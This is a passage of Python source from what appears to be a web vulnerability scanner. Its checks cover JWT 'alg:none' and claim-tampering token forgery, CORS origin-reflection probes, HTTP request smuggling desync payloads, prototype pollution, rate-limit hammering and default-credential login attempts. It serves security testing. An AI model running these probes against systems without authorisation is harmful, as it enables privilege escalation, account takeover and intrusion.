                            json.dumps(payload_obj).encode()
                        ).rstrip(b"=").decode()
                        tampered_token = f"{parts[0]}.{new_payload}.{parts[2]}"
                        resp8 = self._req("GET", source_url,
                                          headers={"Authorization": f"Bearer {tampered_token}"})
                        if resp8 and resp8.status_code in (200, 201, 204):
                            findings.append(self._make_finding(
                                url=source_url, method="GET", param="Authorization:claims",
                                param_type="header", vuln_type="jwt_claim_tamper",
                                finding=f"JWT claim tampering — server accepted token with escalated claims [{source_url}]",
                                severity="high",
                                proof=f"Modified claims: admin/role/is_admin → admin | Status: {resp8.status_code}",
                                payload="Claim escalation",
                            ))
                except Exception:
                    pass

            except Exception:
                continue
        return findings

    def _collect_jwts(self, sitemap) -> list[tuple[str, str]]:
        """Collect JWTs from headers, cookies, and response bodies."""
        tokens = []
        seen = set()
        jwt_pattern = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        for url, page in sitemap.pages.items():
            # Check response headers stored during crawl
            hdrs = page.get("headers", {})
            for hdr_val in hdrs.values():
                if isinstance(hdr_val, str):
                    for m in jwt_pattern.finditer(hdr_val):
                        tok = m.group(0)
                        if tok not in seen:
                            tokens.append((tok, url))
                            seen.add(tok)
            # Also fetch page and check body + Set-Cookie for JWTs
            if len(tokens) < 10:  # limit JWT collection effort
                try:
                    resp = self._req("GET", url)
                    if resp:
                        # Check response body
                        for m in jwt_pattern.finditer(resp.text[:16000]):
                            tok = m.group(0)
                            if tok not in seen:
                                tokens.append((tok, url))
                                seen.add(tok)
                        # Check cookies
                        for cookie_val in resp.headers.get("Set-Cookie", "").split(","):
                            for m in jwt_pattern.finditer(cookie_val):
                                tok = m.group(0)
                                if tok not in seen:
                                    tokens.append((tok, url))
                                    seen.add(tok)
                except Exception:
                    pass
        return tokens

    @staticmethod
    def _b64_decode_jwt(segment: str) -> bytes:
        pad = 4 - len(segment) % 4
        return base64.urlsafe_b64decode(segment + "=" * (pad % 4))

    @staticmethod
    def _make_alg_none_token(header_b64: str, payload_b64: str) -> str:
        none_hdr = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        return f"{none_hdr}.{payload_b64}."

    # ── CORS active ───────────────────────────────────────────────────────────

    def _check_cors_active(self, sitemap) -> list[ScanFinding]:
        """
        Comprehensive CORS misconfiguration testing — ZAP+ parity.

        Tests:
        1. Origin reflection — 14 origin variants (evil.com, null, subdomain,
           protocol downgrade, post-domain bypass, internal, encoded, backtick)
        2. Pre-flight OPTIONS — custom headers/methods allowed?
        3. Vary: Origin missing — CORS cache poisoning risk
        4. Access-Control-Expose-Headers — sensitive headers exposed?
        5. Access-Control-Max-Age — excessive pre-flight cache lifetime?
        """
        findings = []
        parsed = urlparse(self.target)
        target_host = parsed.hostname or parsed.netloc
        target_scheme = parsed.scheme

        # ── 14 origin variants ──
        test_origins = [
            # Basic reflection
            "https://evil.com",
            "null",
            # Subdomain suffix/prefix bypass
            f"https://{target_host}.evil.com",
            f"https://evil.{target_host}",
            # Protocol downgrade (http on https target)
            f"http://{target_host}",
            # Post-domain character bypass (some parsers stop at certain chars)
            f"https://{target_host}%60evil.com",
            f"https://{target_host}.evil.com",
            f"https://{target_host}@evil.com",
            # Regex bypass variants
            f"https://not{target_host}",
            f"https://{target_host}evil.com",
            # Internal network origins
            "https://localhost",
            "https://127.0.0.1",
            "http://169.254.169.254",
            # Encoded / special origins
            "https://evil%2Ecom",
        ]

        seen_urls = set()
        flagged_cors = False

        for url in list(sitemap.pages.keys())[:10]:
            if url in seen_urls or self.stop_event.is_set():
                continue
            seen_urls.add(url)

            # ── Test 1: Origin reflection with each variant ──
            for origin in test_origins:
                if self.stop_event.is_set() or flagged_cors:
                    break
                try:
                    resp = self._req("GET", url, headers={"Origin": origin})
                    if not resp:
                        continue
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

                    if acao == origin and acac == "true":
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_critical",
                            finding=(
                                f"CORS CRITICAL — reflects Origin '{origin}' with "
                                f"credentials=true [{url}]"
                            ),
                            severity="critical",
                            proof=f"ACAO: {acao} | ACAC: {acac}",
                            payload=origin,
                        ))
                        flagged_cors = True
                    elif acao == origin:
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_medium",
                            finding=f"CORS reflects arbitrary origin '{origin}' [{url}]",
                            severity="medium",
                            proof=f"ACAO: {acao}",
                            payload=origin,
                        ))
                    elif acao == "*" and acac == "true":
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_critical",
                            finding=f"CORS wildcard + credentials=true — invalid but dangerous [{url}]",
                            severity="critical",
                            proof=f"ACAO: {acao} | ACAC: {acac}",
                            payload=origin,
                        ))
                        flagged_cors = True
                except Exception:
                    continue

            # ── Test 2: Pre-flight OPTIONS probe ──
            try:
                preflight_resp = self._req("OPTIONS", url, headers={
                    "Origin": "https://evil.com",
                    "Access-Control-Request-Method": "DELETE",
                    "Access-Control-Request-Headers": "X-Custom-Header, Authorization",
                })
                if preflight_resp:
                    acao_pf = preflight_resp.headers.get("Access-Control-Allow-Origin", "")
                    acam_pf = preflight_resp.headers.get("Access-Control-Allow-Methods", "")
                    acah_pf = preflight_resp.headers.get("Access-Control-Allow-Headers", "")

                    # Dangerous: allows DELETE/PUT from any origin
                    if acao_pf in ("*", "https://evil.com") and ("DELETE" in acam_pf or "PUT" in acam_pf):
                        findings.append(self._make_finding(
                            url=url, method="OPTIONS", param="Origin",
                            param_type="header", vuln_type="cors_preflight",
                            finding=f"CORS pre-flight allows dangerous methods from arbitrary origin [{url}]",
                            severity="medium",
                            proof=f"ACAO: {acao_pf} | ACAM: {acam_pf}",
                            payload="OPTIONS + DELETE",
                        ))

                    # Dangerous: allows Authorization header from any origin
                    if acao_pf in ("*", "https://evil.com") and "authorization" in acah_pf.lower():
                        findings.append(self._make_finding(
                            url=url, method="OPTIONS", param="Origin",
                            param_type="header", vuln_type="cors_preflight",
                            finding=f"CORS pre-flight allows Authorization header from arbitrary origin [{url}]",
                            severity="high",
                            proof=f"ACAO: {acao_pf} | ACAH: {acah_pf}",
                            payload="OPTIONS + Authorization",
                        ))
            except Exception:
                pass

            # ── Test 3: Vary: Origin missing (cache poisoning) ──
            try:
                # Send two requests with different Origins, check Vary header
                resp1 = self._req("GET", url, headers={"Origin": f"https://{target_host}"})
                if resp1:
                    acao1 = resp1.headers.get("Access-Control-Allow-Origin", "")
                    vary = resp1.headers.get("Vary", "")
                    if acao1 and acao1 != "*" and "origin" not in vary.lower():
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Vary",
                            param_type="header", vuln_type="cors_cache_poison",
                            finding=f"CORS response missing 'Vary: Origin' — cache poisoning risk [{url}]",
                            severity="medium",
                            proof=f"ACAO: {acao1} | Vary: {vary or '(absent)'}",
                            payload="Vary: Origin missing",
                        ))
            except Exception:
                pass

            # ── Test 4: Sensitive headers exposed via Access-Control-Expose-Headers ──
            try:
                resp_hdr = self._req("GET", url, headers={"Origin": f"https://{target_host}"})
                if resp_hdr:
                    aceh = resp_hdr.headers.get("Access-Control-Expose-Headers", "")
                    if aceh:
                        sensitive_exposed = []
                        for sh in ("Authorization", "Set-Cookie", "X-API-Key",
                                   "X-Auth-Token", "Cookie", "X-CSRF-Token"):
                            if sh.lower() in aceh.lower():
                                sensitive_exposed.append(sh)
                        if sensitive_exposed:
                            findings.append(self._make_finding(
                                url=url, method="GET", param="Expose-Headers",
                                param_type="header", vuln_type="cors_medium",
                                finding=f"CORS exposes sensitive headers: {', '.join(sensitive_exposed)} [{url}]",
                                severity="medium",
                                proof=f"ACEH: {aceh}",
                                payload=f"Exposed: {', '.join(sensitive_exposed)}",
                            ))
            except Exception:
                pass

            # ── Test 5: Excessive Access-Control-Max-Age ──
            try:
                resp_age = self._req("OPTIONS", url, headers={
                    "Origin": f"https://{target_host}",
                    "Access-Control-Request-Method": "GET",
                })
                if resp_age:
                    max_age = resp_age.headers.get("Access-Control-Max-Age", "")
                    if max_age:
                        try:
                            age_val = int(max_age)
                            if age_val > 86400:  # > 24 hours
                                findings.append(self._make_finding(
                                    url=url, method="OPTIONS", param="Max-Age",
                                    param_type="header", vuln_type="cors_cache_poison",
                                    finding=f"CORS pre-flight cache excessive — {age_val}s ({age_val//3600}h) [{url}]",
                                    severity="low",
                                    proof=f"Access-Control-Max-Age: {age_val}",
                                    payload=f"Max-Age: {age_val}",
                                ))
                        except ValueError:
                            pass
            except Exception:
                pass

        return findings

    # ── Prototype pollution ───────────────────────────────────────────────────

    def _check_prototype_pollution(self, surfaces: list) -> list[ScanFinding]:
        findings = []
        payloads = PAYLOADS.get("prototype_pollution", [])
        checked = 0
        for surface in surfaces[:50]:
            if self.stop_event.is_set():
                break
            if surface.param_type not in ("query", "form", "json"):
                continue
            for payload in payloads[:4]:
                try:
                    time.sleep(self.rate_limit)
                    if surface.param_type == "query":
                        url = f"{surface.url}?{surface.param}={payload}"
                        resp = self._req(surface.method, url)
                    elif surface.param_type in ("form", "json"):
                        resp = self._req(
                            surface.method, surface.url,
                            data={surface.param: payload},
                        )
                    else:
                        continue
                    if not resp:
                        continue
                    body = resp.text[:2000]
                    if re.search(r'"isAdmin"\s*:\s*true|"polluted"\s*:\s*"yes"', body):
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="prototype_pollution",
                            finding=f"Prototype pollution CONFIRMED — injected property reflected [{surface.url} | param={surface.param}]",
                            severity="high",
                            proof=body[:300],
                            payload=payload,
                        ))
                        break
                    if re.search(r"Error: Cannot set property|Cannot set properties of", body):
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="prototype_pollution",
                            finding=f"Prototype pollution — server-side TypeError triggered [{surface.url}]",
                            severity="medium",
                            proof=body[:300],
                            payload=payload,
                        ))
                        break
                except Exception:
                    continue
            checked += 1
        return findings

    # ── Exceptional conditions ────────────────────────────────────────────────

    def _check_exceptional_conditions(self, surfaces: list) -> list[ScanFinding]:
        findings = []
        payloads = PAYLOADS.get("exceptional_conditions", [])
        for surface in surfaces[:30]:
            if self.stop_event.is_set():
                break
            for payload in payloads[:6]:
                try:
                    time.sleep(self.rate_limit)
                    if surface.param_type == "query":
                        url = f"{surface.url}?{surface.param}={payload}"
                        resp = self._req(surface.method, url)
                    else:
                        resp = self._req(
                            surface.method, surface.url,
                            data={surface.param: payload},
                        )
                    if not resp:
                        continue
                    if resp.status_code == 500:
                        body = resp.text[:500]
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="exceptional_conditions",
                            finding=f"Exceptional condition — 500 error on edge input [{surface.url} | param={surface.param} | payload={repr(payload[:30])}]",
                            severity="medium",
                            proof=body,
                            payload=repr(payload[:60]),
                        ))
                        break
                    body = resp.text[:2000]
                    error_pat = re.compile(
                        r"Traceback|Fatal error|NullPointerException|TypeError|ValueError|"
                        r"RangeError|undefined is not|Internal Server Error",
                        re.I,
                    )
                    if error_pat.search(body):
                        findings.append(self._make_finding(
                            url=surface.url, method=surface.method,
                            param=surface.param, param_type=surface.param_type,
                            vuln_type="exceptional_conditions",
                            finding=f"Exceptional condition — error detail leaked on edge input [{surface.url}] (A10:2025)",
                            severity="medium",
                            proof=body[:300],
                            payload=repr(payload[:60]),
                        ))
                        break
                except Exception:
                    continue
        return findings

    # ── GraphQL ───────────────────────────────────────────────────────────────

    def _check_graphql(self, sitemap) -> list[ScanFinding]:
        """Delegate to the comprehensive GraphQLScanner module (12 test categories)."""
        # Collect any known GraphQL-like URLs from the sitemap
        extra_urls = [
            url for url in sitemap.pages.keys()
            if any(kw in url.lower() for kw in ("graphql", "gql", "/query", "graphiql"))
        ]

        gql_scanner = GraphQLScanner(
            target=self.target,
            session=self.session,
            stop_event=self.stop_event,
            timeout=self.timeout,
        )
        raw_findings = gql_scanner.scan(extra_urls=extra_urls)

        # Convert GraphQLScanner dicts → ScanFinding objects
        findings = []
        for rf in raw_findings:
            findings.append(self._make_finding(
                url=rf["url"],
                method=rf.get("method", "POST"),
                param=rf.get("param", "query"),
                param_type=rf.get("param_type", "json"),
                vuln_type=rf["vuln_type"],
                finding=rf["finding"],
                severity=rf["severity"],
                proof=rf.get("proof", ""),
                payload=rf.get("payload", ""),
                resp_time_ms=rf.get("resp_time_ms", 0.0),
                status_code=rf.get("status_code", 0),
            ))
        return findings

    # ── WebSocket ─────────────────────────────────────────────────────────────

    def _check_websocket(self, sitemap) -> list[ScanFinding]:
        """Delegate to the comprehensive WebSocketScanner module (9 test categories)."""
        # Collect any known WebSocket URLs from the sitemap
        extra_urls = [
            url for url in sitemap.pages.keys()
            if any(kw in url.lower() for kw in ("websocket", "/ws", "socket", "cable", "signalr"))
        ]

        ws_scanner = WebSocketScanner(
            target=self.target,
            stop_event=self.stop_event,
            timeout=self.timeout,
        )
        raw_findings = ws_scanner.scan(extra_urls=extra_urls)

        # Convert WebSocketScanner dicts → ScanFinding objects
        findings = []
        for rf in raw_findings:
            findings.append(self._make_finding(
                url=rf["url"],
                method=rf.get("method", "WEBSOCKET"),
                param=rf.get("param", "frame"),
                param_type=rf.get("param_type", "websocket"),
                vuln_type=rf["vuln_type"],
                finding=rf["finding"],
                severity=rf["severity"],
                proof=rf.get("proof", ""),
                payload=rf.get("payload", ""),
                resp_time_ms=rf.get("resp_time_ms", 0.0),
                status_code=rf.get("status_code", 0),
            ))
        return findings

    # ── HTTP Smuggling ────────────────────────────────────────────────────────

    def _check_http_smuggling(self, sitemap) -> list[ScanFinding]:
        """
        Comprehensive HTTP Request Smuggling detection:
        1. CL.TE — frontend uses Content-Length, backend uses Transfer-Encoding
        2. TE.CL — frontend uses Transfer-Encoding, backend uses Content-Length
        3. TE.TE — both use TE but obfuscation confuses one side
        4. Timing differential — compare response times between valid/invalid probes

        All probes are safe detection-only (no actual request poisoning).
        Complements the fuzzer's raw-socket approach with requests-based checks.
        """
        findings = []
        urls = list(sitemap.pages.keys())[:5]  # test up to 5 pages

        # ── Probe definitions ──
        probes = [
            # CL.TE: Frontend trusts CL, backend trusts TE
            {
                "name": "CL.TE basic desync",
                "technique": "CL.TE",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "CL.TE oversized CL",
                "technique": "CL.TE",
                "headers": {
                    "Content-Length": "100",
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\n",
            },
            # TE.CL: Frontend trusts TE, backend trusts CL
            {
                "name": "TE.CL basic desync",
                "technique": "TE.CL",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "4",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "1\r\nG\r\n0\r\n\r\n",
            },
            {
                "name": "TE.CL short CL mismatch",
                "technique": "TE.CL",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "0",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "1\r\nZ\r\n0\r\n\r\n",
            },
            # TE.TE: Obfuscated Transfer-Encoding confuses one proxy/server
            {
                "name": "TE.TE leading space obfuscation",
                "technique": "TE.TE",
                "headers": {
                    "Transfer-Encoding": " chunked",
                    "Content-Length": "6",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "TE.TE mixed case obfuscation",
                "technique": "TE.TE",
                "headers": {
                    "Transfer-Encoding": "chunKed",
                    "Content-Length": "6",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "TE.TE identity,chunked obfuscation",
                "technique": "TE.TE",
                "headers": {
                    "Transfer-Encoding": "identity, chunked",
                    "Content-Length": "6",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                "body": "0\r\n\r\nG",
            },
        ]

        for url in urls:
            if self.stop_event.is_set():
                break

            # First, measure baseline response time with a normal POST
            try:
                t_base = time.time()
                self.session.post(
                    url, data="x=1", timeout=self.timeout,
                    verify=False, allow_redirects=False,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                baseline_ms = (time.time() - t_base) * 1000
            except Exception:
                baseline_ms = None

            for probe in probes:
                if self.stop_event.is_set():
                    break
                try:
                    t0 = time.time()
                    resp = self.session.post(
                        url, data=probe["body"], headers=probe["headers"],
                        timeout=self.timeout, verify=False, allow_redirects=False,
                    )
                    elapsed_ms = (time.time() - t0) * 1000

                    # Detection 1: Error status codes indicating desync confusion
                    if resp.status_code in (400, 500, 501, 502, 504, 505):
                        findings.append(self._make_finding(
                            url=url, method="POST", param="Transfer-Encoding",
                            param_type="header", vuln_type="http_smuggling",
                            finding=(f"Possible HTTP smuggling — server returned "
                                     f"{resp.status_code} on {probe['technique']} "
                                     f"probe [{probe['name']}]"),
                            severity="high",
                            proof=(f"{probe['technique']}: {probe['name']} → "
                                   f"{resp.status_code} in {elapsed_ms:.0f}ms"),
                            payload=probe["name"],
                        ))
                        break  # one finding per URL is enough

                    # Detection 2: Timing anomaly — probe takes 3x+ longer than baseline
                    if baseline_ms and elapsed_ms > baseline_ms * 3 and elapsed_ms > 3000:
                        findings.append(self._make_finding(
                            url=url, method="POST", param="Transfer-Encoding",
                            param_type="header", vuln_type="http_smuggling",
                            finding=(f"Possible HTTP smuggling — timing anomaly on "
                                     f"{probe['technique']} probe (baseline: "
                                     f"{baseline_ms:.0f}ms, probe: {elapsed_ms:.0f}ms)"),
                            severity="high",
                            proof=(f"{probe['technique']}: {probe['name']} → "
                                   f"{elapsed_ms:.0f}ms vs baseline {baseline_ms:.0f}ms"),
                            payload=probe["name"],
                        ))
                        break

                    # Detection 3: Response body error patterns
                    body_lower = resp.text[:4096].lower()
                    desync_patterns = [
                        "bad request", "invalid chunk", "content-length mismatch",
                        "transfer-encoding.*not supported", "unexpected end",
                        "proxy error", "gateway timeout", "duplicate header",
                    ]
                    for pat in desync_patterns:
                        if re.search(pat, body_lower):
                            findings.append(self._make_finding(
                                url=url, method="POST", param="Transfer-Encoding",
                                param_type="header", vuln_type="http_smuggling",
                                finding=(f"Possible HTTP smuggling — desync error "
                                         f"pattern in response [{probe['technique']}: "
                                         f"{probe['name']}]"),
                                severity="high",
                                proof=f"Matched pattern: '{pat}' in response body",
                                payload=probe["name"],
                            ))
                            break
                    else:
                        continue
                    break  # break outer probe loop too

                except requests.exceptions.Timeout:
                    findings.append(self._make_finding(
                        url=url, method="POST", param="Transfer-Encoding",
                        param_type="header", vuln_type="http_smuggling",
                        finding=(f"Possible HTTP smuggling — timeout on "
                                 f"{probe['technique']} probe [{probe['name']}]"),
                        severity="high",
                        proof="Request timed out — possible frontend/backend desync",
                        payload=probe["name"],
                    ))
                    break
                except (ConnectionResetError, requests.exceptions.ConnectionError):
                    findings.append(self._make_finding(
                        url=url, method="POST", param="Transfer-Encoding",
                        param_type="header", vuln_type="http_smuggling",
                        finding=(f"Possible HTTP smuggling — connection reset on "
                                 f"{probe['technique']} probe [{probe['name']}]"),
                        severity="high",
                        proof="Connection reset — desync rejection by server/proxy",
                        payload=probe["name"],
                    ))
                    break
                except Exception:
                    continue

        return findings

    # ── Rate limiting ─────────────────────────────────────────────────────────

    def _check_rate_limiting(self, sitemap) -> list[ScanFinding]:
        findings = []
        auth_paths = ["/login", "/signin", "/auth", "/api/login",
                      "/api/auth", "/forgot-password", "/api/v1/login"]

        for path in auth_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            try:
                # Send 15 rapid POST requests
                statuses = []
                for _ in range(15):
                    try:
                        r = self.session.post(
                            url,
                            data={"username": "testuser", "password": "wrongpass"},
                            timeout=5, verify=False, allow_redirects=False,
                        )
                        statuses.append(r.status_code)
                    except Exception:
                        break

                if len(statuses) >= 10:
                    has_429  = any(s == 429 for s in statuses)
                    has_lock = any(s in (423, 403) for s in statuses[8:])
                    if not has_429 and not has_lock:
                        findings.append(self._make_finding(
                            url=url, method="POST", param="",
                            param_type="form", vuln_type="missing_rate_limit",
                            finding=f"No rate limiting on auth endpoint — 15 rapid requests, no 429/lockout [{url}]",
                            severity="high",
                            proof=f"Status codes: {statuses}",
                            payload="15x POST username=testuser&password=wrongpass",
                        ))
                        break  # one finding is enough
            except Exception:
                continue
        return findings

    # ── Supply chain ──────────────────────────────────────────────────────────

    def _check_supply_chain(self, sitemap) -> list[ScanFinding]:
        findings = []
        try:
            resp = self._req("GET", self.target)
            if not resp:
                return findings
            html = resp.text

            # Extract all script src tags
            script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)

            # Check inline version strings + script src names
            combined = html + "\n".join(script_srcs)
            for pattern, msg_template, vtype in self.JS_CVE_PATTERNS:
                m = pattern.search(combined)
                if m:
                    version = m.group(1) if m.lastindex >= 1 else "unknown"
                    msg = msg_template.replace("{v}", version)
                    findings.append(self._make_finding(
                        url=self.target, method="GET", param="script-src",
                        param_type="passive", vuln_type=vtype,
                        finding=msg,
                        severity="medium",
                        proof=m.group(0)[:120],
                        payload="",
                    ))
        except Exception:
            pass
        return findings

    # ── Default credentials ───────────────────────────────────────────────────

    def _check_default_credentials(self, sitemap) -> list[ScanFinding]:
        findings = []
        login_paths = ["/login", "/admin", "/admin/login", "/wp-admin/",
                       "/phpmyadmin/", "/manager/html", "/console"]

        for path in login_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            # Check if endpoint exists first
            try:
                head = self.session.get(url, timeout=5, verify=False, allow_redirects=True)
                if head.status_code not in (200, 401, 403):
                    continue
            except Exception:
                continue

            for username, password in self.DEFAULT_CREDS[:8]:
                try:
                    time.sleep(self.rate_limit * 2)
                    resp = self.session.post(
                        url,
                        data={"username": username, "password": password,
                              "user": username, "pass": password},
                        timeout=self.timeout, verify=False, allow_redirects=True,
                    )
                    # Heuristics for successful login
                    body_l = resp.text.lower()
                    success_signals = [
                        "dashboard", "welcome", "logout", "sign out",
                        "admin panel", "control panel", "settings", "profile",
                    ]
                    fail_signals = [
                        "invalid", "incorrect", "wrong", "failed",
                        "error", "denied", "login", "sign in",
                    ]
                    has_success = any(s in body_l for s in success_signals)
                    has_fail    = any(s in body_l for s in fail_signals)

                    if resp.status_code == 200 and has_success and not has_fail:
                        findings.append(self._make_finding(
                            url=url, method="POST", param="username",
                            param_type="form", vuln_type="default_creds",
                            finding=f"Default credentials CONFIRMED — {username}/{password} grants access [{url}]",
                            severity="critical",
                            proof=f"POST {url} → {resp.status_code} | Body signals: {[s for s in success_signals if s in body_l]}",
                            payload=f"username={username}&password={password}",
                        ))
                        break
                except Exception:
                    continue
        return findings

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _req(
        self,
        method: str,
        url: str,
        headers: dict | None = None,
        data: dict | None = None,
        json_body: str | None = None,
    ) -> requests.Response | None:
        if not self.scope.in_scope(url):
            return None
        try:
            h = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/2.0)"}
            if headers:
                h.update(headers)
            kwargs: dict = {"timeout": self.timeout, "verify": False, "allow_redirects": False}
            if json_body:
                kwargs["data"] = json_body.encode() if isinstance(json_body, str) else json_body
            elif data:
                kwargs["data"] = data
            return self.session.request(method, url, headers=h, **kwargs)
        except Exception:
            return None

    def _make_finding(
        self,
        url: str,
        method: str,
        param: str,
        param_type: str,
        vuln_type: str,
        finding: str,
        severity: str,
        proof: str,
        payload: str,
        evidence_id: str | None = None,
        resp_time_ms: float = 0.0,
        status_code: int = 0,
    ) -> ScanFinding:
        sf = ScanFinding(
            id             = f"sf_{uuid.uuid4().hex[:10]}",
            url            = url,
            method         = method,
            param          = param,
            param_type     = param_type,
            vuln_type      = vuln_type,
            owasp_category = _OWASP.get(vuln_type, "A05:2025 Security Misconfiguration"),
            cwe            = _CWE.get(vuln_type, "CWE-0"),
            finding        = finding,
            severity       = severity,
            proof          = proof,
            payload        = payload,
            evidence_id    = evidence_id,
            remediation    = _REMEDIATION.get(vuln_type, "Review and harden this endpoint."),
            resp_time_ms   = resp_time_ms,
            status_code    = status_code,
        )
        with self._lock:
            self._results.append(sf)
        return sf

    def _emit(self, sf: ScanFinding):
        if self.on_finding:
            try:
                self.on_finding(sf)
            except Exception:
                pass
